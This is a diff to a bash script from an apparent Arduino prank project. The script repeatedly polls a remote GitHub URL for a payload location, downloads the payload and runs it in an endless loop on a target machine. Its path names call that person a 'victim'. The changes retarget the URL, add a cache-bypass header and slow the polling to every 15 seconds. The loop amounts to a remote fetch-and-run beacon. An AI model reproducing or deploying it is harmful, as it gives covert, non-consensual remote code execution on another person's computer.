@@ -5,7 +5,7 @@ SCRIPTDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
 
 ###################################################################
  # Configuration variables
-payloadURL="https://raw.githubusercontent.com/thiesgehrmann/arduinoPranks/master/websiteReactionPrank/victims/michael/scriptloc.txt"
+payloadURL="https://raw.githubusercontent.com/thiesgehrmann/arduinoPranks/master/websiteReactionPrank/scriptloc.txt"
 
 localPayloadLoc="$SCRIPTDIR/payload"
 localPayloadETag="$SCRIPTDIR/payload.etag"
@@ -31,7 +31,7 @@ function getURLETag(){
 
 function getPayloadURL(){
   local url="$1"
-  curl -s "$url" \
+  curl -H 'Cache-Control: no-cache' -s "$url" \
    | grep -v -e '^#' -e'^$' \
    | head -n1
 }
@@ -90,6 +90,6 @@ while [ true ]; do
 
   runPayload
 
-  sleep 5
+  sleep 15
 
 done
